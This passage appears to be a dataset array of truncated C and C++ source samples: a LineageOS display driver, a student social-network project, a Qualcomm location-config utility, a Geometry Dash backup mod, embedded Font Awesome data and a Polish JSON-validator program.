{\n    return WriteStringToFile(std::to_string(enabled), file_, true);\n}\n\n}  // namespace sysfs\n}  // namespace V2_0\n}  // namespace livedisplay\n}  // namespace lineage\n}  // namespace vendor\n",
    "#include<iostream>\r\n#include<fstream>\r\nusing namespace std;\r\n//Declaring all classes to ensure accessibility:\r\nclass Date;\r\nclass Post;\r\nclass Memory;\r\nclass Comment;\r\nclass Object;\r\nclass Page;\r\nclass User;\r\nclass Activity;\r\nclass SocialNetwork;\r\nclass Helper {\r\npublic:\r\n\tstatic int StringLenght(char* str) {\r\n\t\tint count = 0;\r\n\t\tfor (int i = 0; str[i] != '\\0'; i++)\r\n\t\t\tcount++;\r\n\t\treturn count;\r\n\r\n\t}\r\n\tstatic void StringCopy(char*& dest, char*& src) {\r\n\t\tint i;\r\n\t\tfor (i = 0; src[i] != '\\0'; i++)\r\n\t\t\tdest[i] = src[i];\r\n\t\tdest[i] = '\\0';\r\n\t}\r\n\tstatic char* GetStringFromBuffer(char* str) {\r\n\t\tint l = StringLenght(str);\r\n\t\tchar* newstr = new char[l + 1];\r\n\t\tStringCopy(newstr, str);\r\n\t\treturn newstr;\r\n\t}\r\n\tstatic int StringLenght(const char* str) {\r\n\t\tint count = 0;\r\n\t\tfor (int i = 0; str[i] != '\\0'; i++)\r\n\t\t\tcount++;\r\n\t\treturn count;\r\n\r\n\t}\r\n\tstatic void StringCopy(char*& dest, const char*& src) {\r\n\t\tint i;\r\n\t\tfor (i = 0; src[i] != '\\0'; i++)\r\n\t\t\tdest[i] = src[i];\r\n\t\tdest[i] = '\\0';\r\n\t}\r\n\tstatic char* GetStringFromBuffer(const char* str) {\r\n\t\tint l = StringLenght(str);\r\n\t\tchar* newstr = new char[l + 1];\r\n\t\tStringCopy(newstr, str);\r\n\t\treturn newstr;\r\n\t}\r\n\tstatic bool FindExactMatch(char* string, char* tofind) {\r\n\t\tint l = StringLenght(tofind);\r\n\t\tbool check = false;\r\n\t\tint i;\r\n\t\tfor (i = 0; i < l; i++) {\r\n\t\t\tif (string[i] == tofind[i] || string[i] == tofind[i] + 32 || string[i] + 32 == tofind[i])\r\n\t\t\t\tcheck = true;\r\n\t\t\telse {\r\n\t\t\t\tcheck = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn check;\r\n\t}\r\n\tstatic bool FindExactMatch(const char* string, const char* tofind) {\r\n\t\tint l = StringLenght(tofind);\r\n\t\tbool check = false;\r\n\t\tint i;\r\n\t\tfor (i = 0; i < l; i++) {\r\n\t\t\tif (string[i] == tofind[i] || string[i] == tofind[i] + 32 || string[i] + 32 == tofind[i])\r\n\t\t\t\tcheck = true;\r\n\t\t\telse {\r\n\t\t\t\tcheck = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn check;\r\n\t}\r\n\tstatic char* stringConcatenate(const char* s1, char*& s2) \r\n\t{\r\n\t\tchar* newstr = 0;\r\n\t\tint l1 = StringLenght(s1), l2 = StringLenght(s2);\r\n\t\t//Since s1 and s2 both are exactly equal in terms of size to what is stored in them, we create a new string equal to the lengths of s1+s2.\r\n\t\tnewstr = new char[l1 + l2 + 1];\r\n\t\tint i;\r\n\t\t//Copying s1 into newstr.\r\n\t\tfor (i = 0; s1[i] != '\\0'; i++)\r\n\t\t\tnewstr[i] = s1[i];\r\n\t\tint j;\r\n\t\t//Copying s2 into newstr, i helps in storing further data into newstr from where s1 left.\r\n\t\tfor (j = i, i = 0; s2[i] != '\\0'; j++, i++)\r\n\t\t\tnewstr[j] = s2[i];//Storing a null at the end.\r\n\t\tnewstr[l1 + l2] = '\\0';\r\n\t\tdelete[]s2;\r\n\t\treturn newstr;\r\n\t}\r\n\tstatic char* IntToCharArray(int n)\r\n\t{\t//Making 'a' a copy for n so we work on it without changing n. \"count\" will count the size for the newly generated array storing the integer n.\r\n\t\tint a = n, count = 0;\r\n\t\t//The following loop calculates the size of required array. \r\n\t\twhile (a > 0)\r\n\t\t{\r\n\t\t\tcount++; //For each instance this loop runs, we increment the count(size) by one.\r\n\t\t\ta = a / 10; //Reducing the number to its lower form. For example if n is 100, then it drops to 10 and so on. \r\n\t\t}\r\n\t\tchar* arr = new char[count + 1];\r\n\t\tarr[count] = '\\0';\r\n\t\twhile (n > 0)\r\n\t\t{\r\n\t\t\tint b = n % 10; //Getting last digit in n.\r\n\t\t\tarr[--count] = b + '0'; //Storing b as ASCII in arr.\r\n\t\t\tn = n / 10; //Reducing the number to its lower form. For example if n is 100, then it drops to 10 and so on. \r\n\t\t}\r\n\t\treturn arr;\r\n\t}\r\n\tstatic char* GenerateNewID(const char* prefix, int postfix)\r\n\t{\r\n\t\tchar* newIDNo = IntToCharArray(postfix);\r\n\t\tchar* newID = stringConcatenate(prefix, newIDNo);\r\n\t\treturn newID;\r\n\t}\r\n};\r\nclass Date\r\n{\r\n\tint day;\r\n\tint month;\r\n\tint year;\r\npublic:\r\n\tstatic Date Today;\r\n\t\t//Constructor:\r\n\tDate()\r\n\t{\r\n\t\tday = month = year = 0;\r\n\t}\r\n\t   //Setter:\r\n\tstatic void SetAsToday(int D, int M, int Y)\r\n\t{\r\n\t\tcout << \"\\n------------------------------------------------------------------------------------------------------------------------\\n Command:\\t\\t\\t\\tSet Current System Date \" << D << \" \" << M << \" \" << Y << \"\\nSystem Date\\t\";\r\n\t\tToday.day = D;\r\n\t\tToday.month = M;\r\n\t\tToday.year = Y;\r\n\t\tcout << Today;\r\n\t}\r\n\t\t//Comparison/Arithmetic operations:\r\n\tint operator-(Date d)\r\n\t{\r\n\t\treturn year - d.year;\r\n\t}\r\n\tbool CompareDayAndMonth()\r\n\t{\r\n\t\treturn (day == Today.day && month == Today.month);\r\n\t}\r\n\tbool operator==(Date date)\r\n\t{\r\n\t\tif ((day == date.day || day == (date.day - 1)) && month == date.month && year == date.year)\r\n\t\t\treturn true;\r\n\t\telse if (date.month == month - 1 && day - 1 == 0)\r\n\t\t\treturn true;\r\n\t\telse\r\n\t\t\treturn false;\r\n\t}\r\n\t\t//File Reader:\r\n\tvoid ReadDateFromFile(ifstream& read)\r\n\t{\r\n\t\tread >> day;\r\n\t\tread >> month;\r\n\t\tread >> year;\r\n\t}\r\n\t\t// Overloaded extraction operator.\r\n\tfriend ostream& operator<<(ostream& output, Date d)\r\n\t{\r\n\t\toutput << \" (\" << d.day << \"/\" << d.month << \"/\" << d.year << \")\";\r\n\t\treturn output;\r\n\t}\r\n\t\t//Destructor:\r\n\t~Date()\r\n\t{\r\n\t\t//Empty as there is nothing to be deleted.\r\n\t}\r\n};\r\nclass Object\r\n{\t//Object class is only created to facilitate Polymorphism between User and Page.\r\n\tchar* ID;",
    "/* Copyright (c) 2011-2015, 2018-2020 The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation, nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#define LOG_NDEBUG 0\n#define LOG_TAG \"LocSvc_utils_cfg\"\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n#include <string.h>\n#include <ctype.h>\n#include <unistd.h>\n#include <time.h>\n#include <grp.h>\n#include <errno.h>\n#include <loc_cfg.h>\n#include <loc_pla.h>\n#include <loc_target.h>\n#include <loc_misc_utils.h>\n#ifdef USE_GLIB\n#include <glib.h>\n#endif\n#include \"log_util.h\"\n\n/*=============================================================================\n *\n *                          GLOBAL DATA DECLARATION\n *\n *============================================================================*/\n\n/* Parameter data */\nstatic uint32_t DEBUG_LEVEL = 0xff;\nstatic uint32_t TIMESTAMP = 0;\nstatic uint32_t DATUM_TYPE = 0;\nstatic bool sVendorEnhanced = true;\nstatic uint32_t sLogBufferEnabled = 0;\n\n/* Parameter spec table */\nstatic const loc_param_s_type loc_param_table[] =\n{\n    {\"DEBUG_LEVEL\",             &DEBUG_LEVEL,        NULL, 'n'},\n    {\"TIMESTAMP\",               &TIMESTAMP,          NULL, 'n'},\n    {\"DATUM_TYPE\",              &DATUM_TYPE,         NULL, 'n'},\n    {\"LOG_BUFFER_ENABLED\",      &sLogBufferEnabled,  NULL, 'n'},\n};\nstatic const int loc_param_num = sizeof(loc_param_table) / sizeof(loc_param_s_type);\n\ntypedef struct loc_param_v_type\n{\n    char* param_name;\n    char* param_str_value;\n    int param_int_value;\n    double param_double_value;\n}loc_param_v_type;\n\n// Reference below arrays wherever needed to avoid duplicating\n// same conf path string over and again in location code.\nconst char LOC_PATH_GPS_CONF[] = LOC_PATH_GPS_CONF_STR;\nconst char LOC_PATH_IZAT_CONF[] = LOC_PATH_IZAT_CONF_STR;\nconst char LOC_PATH_FLP_CONF[] = LOC_PATH_FLP_CONF_STR;\nconst char LOC_PATH_LOWI_CONF[] = LOC_PATH_LOWI_CONF_STR;\nconst char LOC_PATH_SAP_CONF[] = LOC_PATH_SAP_CONF_STR;\nconst char LOC_PATH_APDR_CONF[] = LOC_PATH_APDR_CONF_STR;\nconst char LOC_PATH_XTWIFI_CONF[] = LOC_PATH_XTWIFI_CONF_STR;\nconst char LOC_PATH_QUIPC_CONF[] = LOC_PATH_QUIPC_CONF_STR;\nconst char LOC_PATH_ANT_CORR[] = LOC_PATH_ANT_CORR_STR;\nconst char LOC_PATH_SLIM_CONF[] = LOC_PATH_SLIM_CONF_STR;\nconst char LOC_PATH_VPE_CONF[] = LOC_PATH_VPE_CONF_STR;\n\nbool isVendorEnhanced() {\n    return sVendorEnhanced;\n}\nvoid setVendorEnhanced(bool vendorEnhanced) {\n    sVendorEnhanced = vendorEnhanced;\n}\n\n/*===========================================================================\nFUNCTION loc_get_datum_type\n\nDESCRIPTION\n   get datum type\n\nPARAMETERS:\n   N/A\n\nDEPENDENCIES\n   N/A\n\nRETURN VALUE\n   DATUM TYPE\n\nSIDE EFFECTS\n   N/A\n===========================================================================*/\nint loc_get_datum_type()\n{\n    return DATUM_TYPE;\n}\n\n/*===========================================================================\nFUNCTION loc_set_config_entry\n\nDESCRIPTION\n   Potentially sets a given configuration table entry based on the passed in\n   configuration value. This is done by using a string comparison of the\n   parameter names and those found in the configuration file.\n\nPARAMETERS:\n   config_entry: configuration entry in the table to possibly set\n   config_value: value to store in the entry if the parameter names match\n\nDEPENDENCIES\n   N/A\n\nRETURN VALUE\n   None\n\nSIDE EFFECTS\n   N/A\n===========================================================================*/\nint loc_set_config_entry(const loc_param_s_type* config_entry,\n                        loc_param_v_type* config_va",
    "#include <Geode/modify/MenuLayer.hpp>\n#include <Geode/modify/AccountLayer.hpp>\n#include <Geode/modify/OptionsLayer.hpp>\n#include <Geode/modify/AppDelegate.hpp>\n#include <chrono>\n#include <filesystem>\n#include <fmt/chrono.h>\n\nusing namespace geode::prelude;\n\nusing Clock = std::chrono::system_clock;\nusing Time = std::chrono::time_point<Clock>;\n\nstatic std::string toAgoString(Time const& time) {\n    auto const fmtPlural = [](auto count, auto unit) {\n        if (count == 1) {\n            return fmt::format(\"{} {} ago\", count, unit);\n        }\n        return fmt::format(\"{} {}s ago\", count, unit);\n    };\n    auto now = Clock::now();\n    auto len = std::chrono::duration_cast<std::chrono::minutes>(now - time).count();\n    if (len < 60) {\n        return \"Just now\";\n    }\n    len = std::chrono::duration_cast<std::chrono::hours>(now - time).count();\n    if (len < 24) {\n        return fmtPlural(len, \"hour\");\n    }\n    len = std::chrono::duration_cast<std::chrono::days>(now - time).count();\n    if (len < 31) {\n        return fmtPlural(len, \"day\");\n    }\n    return fmt::format(\"{:%b %d %Y}\", time);\n}\n\nstruct BackupMetadata final {\n\tstd::optional<std::string> name;\n\tstd::string user = GameManager::get()->m_playerName;\n\tTime time = Clock::now();\n\n\tBackupMetadata() = default;\n\tBackupMetadata(Time time) : time(time) {}\n};\n\ntemplate <>\nstruct matjson::Serialize<BackupMetadata> {\n    static matjson::Value to_json(BackupMetadata const& info) {\n\t\treturn matjson::Object({\n\t\t\t{ \"name\", info.name },\n\t\t\t{ \"user\", info.user },\n\t\t\t{ \"time\", std::chrono::duration_cast<std::chrono::hours>(info.time.time_since_epoch()).count() },\n\t\t});\n\t}\n    static BackupMetadata from_json(matjson::Value const& value) {\n\t\tauto info = BackupMetadata();\n\t\tauto obj = value.as_object();\n\t\tif (!obj[\"name\"].is_null()) {\n\t\t\tinfo.name = obj[\"name\"].as_string();\n\t\t}\n\t\tinfo.user = obj[\"user\"].as_string();\n\t\tinfo.time = Time(std::chrono::hours(obj[\"time\"].as_int()));\n\t\treturn info;\n\t}\n\tstatic bool is_json(matjson::Value const& value) {\n\t\tif (!value.is_object()) {\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n};\n\nstatic constexpr size_t BACKUPINFO_CACHE_VERSION = 1;\nstruct BackupInfo final {\n\tint playerIcon = 0;\n\tint playerColor1 = 0;\n\tint playerColor2 = 0;\n\tstd::optional<int> playerGlow = 0;\n\tsize_t starCount = 0;\n\tsize_t levelCount = 0;\n};\n\ntemplate <>\nstruct matjson::Serialize<BackupInfo> {\n    static matjson::Value to_json(BackupInfo const& info) {\n\t\treturn matjson::Object({\n\t\t\t{ \"version\", BACKUPINFO_CACHE_VERSION },\n\t\t\t{ \"playerIcon\", info.playerIcon },\n\t\t\t{ \"playerColor1\", info.playerColor1 },\n\t\t\t{ \"playerColor2\", info.playerColor2 },\n\t\t\t{ \"playerGlow\", info.playerGlow },\n\t\t\t{ \"starCount\", info.starCount },\n\t\t\t{ \"levelCount\", info.levelCount },\n\t\t});\n\t}\n    static BackupInfo from_json(matjson::Value const& value) {\n\t\tauto info = BackupInfo();\n\t\tauto obj = value.as_object();\n\t\tinfo.playerIcon = obj[\"playerIcon\"].as_int();\n\t\tinfo.playerColor1 = obj[\"playerColor1\"].as_int();\n\t\tinfo.playerColor2 = obj[\"playerColor2\"].as_int();\n\t\tif (!obj[\"playerGlow\"].is_null()) {\n\t\t\tinfo.playerGlow = obj[\"playerGlow\"].as_int();\n\t\t}\n\t\tinfo.starCount = obj[\"starCount\"].as_int();\n\t\tinfo.levelCount = obj[\"levelCount\"].as_int();\n\t\treturn info;\n\t}\n\tstatic bool is_json(matjson::Value const& value) {\n\t\tif (!value.is_object()) {\n\t\t\treturn false;\n\t\t}\n\t\treturn value[\"version\"].as_int() == BACKUPINFO_CACHE_VERSION;\n\t}\n};\n\nstatic bool DO_NOT_SAVE_GAME = false;\nclass $modify(AppDelegate) {\n\tvoid trySaveGame(bool idk) {\n\t\tif (DO_NOT_SAVE_GAME) return;\n\t\tAppDelegate::trySaveGame(idk);\n\t}\n};\n\nclass Backup final : public CCObject {\nprivate:\n\tstd::filesystem::path m_path;\n\tBackupMetadata m_meta;\n\n\tBackup(std::filesystem::path const& path) : m_path(path) {\n\t\tif (auto meta = file::readFromJson<BackupMetadata>(path / \"metadata.json\")) {\n\t\t\tm_meta = *meta;\n\t\t}\n\t\t// Fix corrupt metadata\n\t\telse {\n\t\t\tstd::error_code ec;\n\t\t\tauto time = std::chrono::time_point_cast<Time::duration>(\n\t\t\t\tstd::filesystem::last_write_time(path, ec) - std::chrono::file_clock::now() + Clock::now()\n\t\t\t);\n\t\t\t(void)file::writeToJson(path / \"metadata.json\", BackupMetadata(time));\n\t\t}\n\t\tthis->autorelease();\n\t}\n\npublic:\n\tstatic std::vector<Ref<Backup>> get(std::filesystem::path const& dir) {\n\t\tstd::vector<Ref<Backup>> backups;\n\t\tfor (auto b : file::readDirectory(dir, false).unwrapOrDefault()) {\n\t\t\tif (\n\t\t\t\tstd::filesystem::exists(b / \"CCGameManager.dat\") || \n\t\t\t\tstd::filesystem::exists(b / \"CCLocalLevels.dat\")\n\t\t\t) {\n\t\t\t\tbackups.push_back(Ref(new Backup(b)));\n\t\t\t}\n\t\t}\n\t\tstd::sort(backups.begin(), backups.end(), [](auto first, auto second) {\n\t\t\treturn first->m_meta.time > second->m_meta.time;\n\t\t});\n\t\treturn backups;\n\t}\n\tstatic Result<> create(std::filesystem::path const& backupsDir) {\n\t\tauto time = std::chrono::system_clock::now();\n\t\tstd::string dirname;\n\t\ttry {\n\t\t\t// fmt::format uses exceptions :sob:\n\t\t\tdirname = fmt::format(\"{:%Y-%m-%d_%H-%M}\", time);\n\t\t}\n\t\tcatch(...) {\n\t\t\tdirname = \"unktime\";\n\t\t}\n\n\t\tstd::string findname = dirname;\n\t\tsize",
    "#pragma once\nstatic const unsigned int font_awesome_size = 124565;\nstatic const unsigned int font_awesome_data[124568 / 4] =\n{\n    0x0000bc57, 0x00000000, 0xac860200, 0x00000400, 0x00010037, 0x000d0000, 0x00030080, 0x54464650, 0x47be6b4d, 0x860200b9, 0x28158290, 0x4544471c,\n    0x00f00246, 0x200f8204, 0x2c0f8270, 0x2f534f20, 0x7a328832, 0x01000040, 0x360f8258, 0x616d6360, 0x3abf0a70, 0x0c00007f, 0x020000a8, 0x736167f2,\n    0x82ffff70, 0x86022249, 0x381f8268, 0x796c6708, 0xaef78f66, 0x1a00004d, 0x4c0200ac, 0x616568bc, 0xe5891064, 0x201b822d, 0x210382dc, 0x10826836,\n    0x0a030f27, 0x010000b5, 0x280f8214, 0x746d6824, 0x18794578, 0x3c0f8285, 0x0a0000b8, 0x636f6cf0, 0xa2f50261, 0x0f00005c, 0x0b00009c, 0x78616d10,\n    0x022c0370, 0x201f821c, 0x272f8238, 0x6d616e20, 0x8b97e365, 0x67355b82, 0x04000068, 0x736f7086, 0x9b8faf74, 0x6b0200a1, 0x1a0000f0, 0x2ddb8475,\n    0x90cb0104, 0x5f5978cf, 0x00f53c0f, 0x3682070b, 0xd4000025, 0x8332cd33, 0x20078308, 0x22b082ff, 0x83060109, 0x0008220e, 0x20318402, 0x22058300,\n    0x82ff0006, 0x00092113, 0xff221f82, 0x17860109, 0x02851182, 0x83b50221, 0xc3022511, 0x27001902, 0x02211184, 0x20358300, 0x20058201, 0x83038240,\n    0x06032c02, 0x00900169, 0x04000005, 0x8233048c, 0x85862010, 0x73022107, 0x8a202882, 0x02980f82, 0x72797029, 0x00400073, 0x8500f520, 0x85062083,\n    0x875b837c, 0x00202633, 0x00800301, 0x280e8370, 0x00005502, 0x0000c001, 0xa20c8207, 0x065d2103, 0x06212782, 0x202f8980, 0x830b8206, 0x82052003,\n    0x86072017, 0x8307200b, 0x2403850b, 0x00800579, 0x2023876e, 0x82138506, 0x00002297, 0x212b8505, 0x1382061a, 0x80221784, 0x27843200, 0x17870f86,\n    0x17821f88, 0x33820420, 0x00000724, 0x07820640, 0x0f860320, 0x17857b84, 0x47860020, 0x13820020, 0x82050a21, 0x8306201f, 0x87038217, 0x82042023,\n    0x83072013, 0x999f89bf, 0x823783f7, 0x20338327, 0x84078606, 0x834f863b, 0x234f880b, 0x057a0080, 0x1f412f86, 0x263b840b, 0x05010002, 0x829a0000,\n    0x845a2003, 0x8edf961b, 0x8440201b, 0x0080230f, 0x03820635, 0x37857784, 0x82050d21, 0x20038367, 0x41738206, 0x05200b1b, 0x77411782, 0x8310200a,\n    0x0ca7410f, 0x07233f82, 0x845a0000, 0x832b8203, 0x411f841b, 0x4021054b, 0x201f8207, 0x839b8a08, 0x8203840f, 0x217f8a1f, 0x0f870300, 0x06200782,\n    0x88068341, 0x2013861f, 0x87078606, 0x870520ab, 0x00802757, 0x0000042c, 0x9b41065f, 0x8605200a, 0x266b842b, 0x06400000, 0x86020000, 0x4100200b,\n    0x0f8d0e13, 0x15008022, 0x05232783, 0x41050080, 0x4b8308d3, 0x10008023, 0x20078507, 0x20178273, 0x20238601, 0x864b8b04, 0x8c0f205f, 0x008022b7,\n    0x410f821b, 0x9f830577, 0x09200382, 0x4b830382, 0x07820420, 0x02230383, 0x82400080, 0x06002103, 0x13875f82, 0x47880783, 0x0b822782, 0x3b412820,\n    0x220f8208, 0x84008003, 0x82062083, 0x0b334233, 0x03835783, 0x83072341, 0x2003821b, 0x83138740, 0x821b88af, 0x821f8477, 0x82062043, 0x23cb870b,\n    0x2d000004, 0x0d240382, 0x4d008004, 0x9b820383, 0x03822d20, 0x63870f88, 0x00211b82, 0x20d38603, 0x21438506, 0x6b410700, 0x20078305, 0x82138800,\n    0x137b411b, 0x9f844787, 0x80223783, 0x13820d00, 0x0f822d20, 0x02253b83, 0x02008005, 0x06134106, 0x60210786, 0x820f8202, 0x06622403, 0x83050000,\n    0x202f8203, 0x821b8401, 0x82052017, 0x8305203f, 0x240b858f, 0x00800603, 0x0b434124, 0xd342df87, 0x830c2006, 0x8204201b, 0x8206202b, 0x82052033,\n    0x43012007, 0x07230a6b, 0x87360000, 0x00042317, 0x03830300, 0x221c3742, 0x41000000, 0x34220abb, 0x0f828203, 0x04000322, 0x07208f83, 0x05231b82,\n    0x88380000, 0x0080233f, 0x03820622, 0x00000723, 0x82038322, 0x84222017, 0x00802103, 0x82053341, 0x220f822f, 0x8480051b, 0x420020e3, 0x0b200ac3,\n    0x23824388, 0x4b440520, 0x06442109, 0x03200f82, 0x0383a782, 0x20064f41, 0x821f8400, 0x21078423, 0x3b880000, 0x00000523, 0x44db842c, 0x07200a87,\n    0x07821386, 0x80064028, 0x80072000, 0x3b41ffff, 0x83052007, 0x00002243, 0x43ff9015, 0x05200aab, 0x08200b82, 0xb386bf8a, 0x42080021, 0x062306ef,\n    0x456d0000, 0x0b840ba7, 0x23833f86, 0xf6220f84, 0x638b2900, 0x9b457f88, 0x83402009, 0x44092013, 0xa3430a53, 0x00002208, 0x86478310, 0x8320204b,\n    0x89042047, 0x0de3437b, 0x20192b45, 0x07af4427, 0x2020bf86, 0x13200782, 0x4421638a, 0x05cb4106, 0x13823920, 0x6b831220, 0x820fd742, 0x053e240f,\n    0x8f180000, 0x8a2787c7, 0x82192007, 0x8264200b, 0x86592027, 0x862a20b7, 0x82092067, 0x83272007, 0x820393e3, 0x830e202b, 0x41052003, 0x0620063b,\n    0x538a8f82, 0x93870020, 0x1f830787, 0x00205f86, 0x0f874f83, 0x00000523, 0x062b410b, 0x8b081b41, 0x0a4b410f, 0x1b845384, 0x03827383, 0x13201b86,\n    0x53874b83, 0x2006e342, 0x061f4102, 0x6f450020, 0x0702280a, 0x08010080, 0x86060000, 0x8202201b, 0x0504210b, 0x42054741, 0x838407db, 0xcf871383,\n    0x7b846386, 0x03871383, 0x24062341, 0x00f80800, 0x427b8354, 0x2b41070f, 0x4205200f, 0x7f4206db, 0x8763840a, 0x42378727, 0xcf4410d3, 0x0bbf4206,\n    0x210b4b41, 0xa348b507, 0x42178209, 0x0523088f, 0x84660000, 0x00b8224b, 0x86978700, 0x08774643, 0x00202f82, 0x16201382, 0x0e202782, 0x1d200782,\n    0x20121342, 0x06f74500, 0x2b862520, 0x86081f41, 0x41522017, 0x3f820b07, 0x6b8a4520, 0xd3872020, 0x2420db8a, 0xdf42df8f, 0x8221200a, 0",
    "\ufeff#include <iostream>\n#include <fstream>\n#include <string>\n#include <cstdlib>\n\nusing namespace std;\n\nvoid jest_json(bool json, ifstream& plik) {         //funkcja wyswietla informacje o poprawnosci pliku i wychodzi z programu\n    cout << \"PLIK JEST PRAWIDLOWYM FORMATEM JSON!\" << endl;\n    json = true;\n    plik.close();\n    exit(0);\n}\n\nvoid nie_jest_json(int liczw, bool json, ifstream& plik) {        //funkcja wyswietla informacje o niepoprawnosci pliku i wychodzi z programu\n    cout << \"PLIK NIE JEST PRAWIDLOWYM FORMATEM JSON! BLAD WYSTEPUJE W \" << liczw + 1 << \" ZNAKU\" << endl;\n    json = true;\n    plik.close();\n    exit(0);\n}\nvoid sprawdzenie_dla_ws(int liczw, bool json, ifstream& plik, char t[], int wyraz) {        //jezeli przed indexem miejsca (liczws) jest WS\n    liczw++;\n    if (t[liczw + 1] != ' ' && t[liczw + 1] != '\\n' && t[liczw + 1] != '\\t' && t[liczw + 1] != '\\r') {\n        nie_jest_json(liczw, json, plik);\n    }\n\n    while (t[liczw + 1] == ' ' || t[liczw + 1] == '\\n' || t[liczw + 1] == '\\t' || t[liczw + 1] == '\\r') {\n        liczw++;\n        \n        if (liczw == wyraz - 1) {\n            jest_json(json, plik);\n        }\n\n        if (t[liczw + 1] != ' ' && t[liczw + 1] != '\\n' && t[liczw + 1] != '\\t' && t[liczw + 1] != '\\r') {\n            nie_jest_json(liczw, json, plik);\n        }\n    }\n}\n\nvoid sprawdzenie_po_kropce(int liczw, bool json, ifstream& plik, char t[], int wyraz) {        //jezeli przed indexem miejsca (liczws) jest kropka\n    liczw++;\n    if (t[liczw + 1] != '0' && t[liczw + 1] != '1' && t[liczw + 1] != '2' && t[liczw + 1] != '3' && t[liczw + 1] != '4' && t[liczw + 1] != '5' && t[liczw + 1] != '6' && t[liczw + 1] != '7' && t[liczw + 1] != '8' && t[liczw + 1] != '9') {\n        nie_jest_json(liczw, json, plik);\n    }\n    else {\n        while (t[liczw + 1] == '0' || t[liczw + 1] == '1' || t[liczw + 1] == '2' || t[liczw + 1] == '3' || t[liczw + 1] == '4' || t[liczw + 1] == '5' || t[liczw + 1] == '6' || t[liczw + 1] == '7' || t[liczw + 1] == '8' || t[liczw + 1] == '9') {\n\n            liczw++;\n\n            if (liczw == wyraz - 1) {\n                jest_json(json, plik);\n            }\n\n            if (t[liczw + 1] == ' ' || t[liczw + 1] == '\\n' || t[liczw + 1] == '\\t' || t[liczw + 1] == '\\r') {\n                sprawdzenie_dla_ws(liczw,json, plik, t, wyraz);\n\n            }\n            if (t[liczw + 1] != '0' && t[liczw + 1] != '1' && t[liczw + 1] != '2' && t[liczw + 1] != '3' && t[liczw + 1] != '4' && t[liczw + 1] != '5' && t[liczw + 1] != '6' && t[liczw + 1] != '7' && t[liczw + 1] != '8' && t[liczw + 1] != '9' && t[liczw + 1] != ' ' && t[liczw + 1] != '\\n' && t[liczw + 1] != '\\t' && t[liczw + 1] != '\\r') {\n                nie_jest_json(liczw,json, plik);\n            }\n        }\n        \n    }\n}\n\nint main()\n{\n    char opcje;          //zmienna do switch case\n    string nazwa_pliku;  //nazwa pliku do wpisania\n    int licznik = 0;     //licznik \n    char tab[1001];     //tablica skladujaca dane wczytane z pliku\n    int wyrazy = 0;     //ilosc wyrazow w pliku\n    int ws = 0;         //licznik zliczajacy znaki WS przed pojawieniem sie 1 znaku nie bedacego WS\n    int liczws = 0;     //licznik aktualnej pozycji w tablicy wczytanych charow\n    bool sprawdzenie_json = false;    //jesli = true - program wykonal sprawdzenie formatu pliku\n    ifstream plik;      // wczytywany plik\n\n    do {\n        wyrazy = 0;    //zerowanie wszystkich wartosci na poczatku petli\n        licznik = 0;\n        ws = 0;\n        liczws = 0;\n        for (int j = 0; j < 1000; j++) {\n            tab[j] = ' ';\n        }\n        cout << \"=============================================PROJEKT JSON===========================================\" << endl;\n        cout << \"'H'-menu pomocnicze | 'O'-otworz plik | 'C'-sprawdz poprawnosc formatu JSON | 'Q' - wyjdz z programu\" << endl << endl;\n        cout << \"Wybierz opcje:\" << endl;\n        cin >> opcje;\n        system(\"cls\");\n        switch (opcje) {\n        case 'h':     //operacja h - wyswietlenie helpa\n            cout << \"LISTA DOSTEPNYCH OPERACJI:\" << endl;\n            cout << \"'O'- Operacja otwarcia pliku o nazwie podanej przez uzytkownika. Operacja informuje, czy plik zostal otwarty.\" << endl;\n            cout << \"'H'- Operacja wyswietla liste dostepnych operacji\" << endl;\n            cout << \"'C'- Operacja sprawdza, czy otwarty plik jest poprawnym formatem JSON. Jesli nie jest, to wskazuje miejsce bledu w pliku\" << endl;\n            cout << \"'P'- Operacja pobiera dane z pliku przy uzyciu JSONpath. Podaje wartosc danych oraz informuje o typie danych\" << endl;\n            cout << \"PROJEKT WYKONAL BARTLOMIEJ RADZIUN 186914\" << endl;\n            system(\"pause\");\n            system(\"cls\");\n            break;\n\n        case 'o':    //operacja o - otwarcie pliku\n            plik.close();\n            cout << \"podaj nazwe pliku: \" << endl;\n            cin >> nazwa_pliku;\n            plik.open(nazwa_pliku);\n            if (plik.is_open()) {\n                cout << \"Plik jest otwarty\" << endl;",
